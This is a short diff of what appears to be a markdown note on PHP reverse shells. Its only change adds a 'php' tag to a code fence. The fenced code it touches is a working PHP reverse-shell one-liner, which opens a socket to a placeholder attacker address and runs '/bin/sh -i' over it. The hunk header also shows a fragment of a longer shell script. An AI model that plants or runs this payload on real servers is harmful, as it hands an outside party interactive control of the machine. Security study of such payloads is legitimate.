@@ -22,7 +22,7 @@ $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s
 ```
 ![](media/c62949c5cacf6d6a5605200311aa5b9a.jpg)
 
-```
+```php
 <?php
 $sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3"); 
 ?>
